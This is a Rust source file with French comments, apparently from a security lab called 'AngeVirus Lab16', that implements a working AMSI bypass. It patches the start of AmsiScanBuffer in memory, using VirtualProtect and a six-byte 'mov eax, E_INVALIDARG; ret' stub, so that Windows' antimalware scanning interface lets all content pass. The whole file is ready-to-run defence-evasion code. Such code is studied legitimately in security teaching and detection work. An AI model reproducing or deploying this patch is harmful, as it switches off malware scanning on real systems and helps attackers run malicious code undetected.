#[cfg(windows)]
use winapi::um::{
    libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
    memoryapi::VirtualProtect,
    winnt::PAGE_EXECUTE_READWRITE,
};

#[cfg(windows)]
fn amsi_bypass() -> bool {
    unsafe {
        // Charger amsi.dll dans le processus courant
        LoadLibraryA(b"amsi.dll\0".as_ptr() as _);

        let h_amsi = GetModuleHandleA(b"amsi.dll\0".as_ptr() as _);
        if h_amsi.is_null() {
            eprintln!("[-] amsi.dll introuvable");
            return false;
        }

        let fn_addr = GetProcAddress(h_amsi, b"AmsiScanBuffer\0".as_ptr() as _) as *mut u8;
        if fn_addr.is_null() {
            eprintln!("[-] AmsiScanBuffer introuvable");
            return false;
        }

        // Patch : mov eax, 0x80070057 (E_INVALIDARG) ; ret
        // AMSI interprète E_INVALIDARG comme "scan échoué" → laisse passer
        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
        let mut old_protect: u32 = 0;

        // Rendre la page du code writable
        VirtualProtect(fn_addr as _, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_protect);
        std::ptr::copy_nonoverlapping(patch.as_ptr(), fn_addr, patch.len());
        // Restaurer les protections originales
        VirtualProtect(fn_addr as _, patch.len(), old_protect, &mut old_protect);

        println!("[+] AmsiScanBuffer @ {:p}", fn_addr);
        println!("[*] Patch appliqué : {:02x?}", patch);
        true
    }
}

fn main() {
    #[cfg(windows)]
    {
        println!("[*] AMSI Bypass — AngeVirus Lab16");
        if amsi_bypass() {
            println!("[+] AMSI neutralisé — AmsiScanBuffer retourne E_INVALIDARG");
        } else {
            std::process::exit(1);
        }
    }

    #[cfg(not(windows))]
    {
        eprintln!("[-] Ce lab nécessite Windows.");
        eprintln!("    Cross-compile depuis WSL2 :");
        eprintln!("    cargo build --release --target x86_64-pc-windows-gnu");
    }
}
